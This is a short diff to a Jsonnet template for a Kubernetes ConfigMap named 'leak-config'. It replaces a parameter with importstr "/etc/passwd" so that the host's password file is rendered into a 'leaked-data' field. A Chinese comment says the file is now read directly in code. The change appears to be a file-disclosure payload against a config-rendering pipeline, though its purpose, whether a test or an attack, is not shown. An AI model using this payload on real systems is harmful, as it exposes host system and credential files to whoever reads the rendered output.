@@ -1,11 +1,11 @@
-function(fileContent="default") {
+{
   apiVersion: "v1",
   kind: "ConfigMap",
   metadata: {
-    name: "leak-config",
+    name: "leak-config-final",
   },
   data: {
-    // 这里是将变量渲染到输出的关键
-    "leaked-data": fileContent
+    // 直接在代码里执行 importstr，不再依赖外部变量
+    "leaked-data": importstr "/etc/passwd"
   }
 }
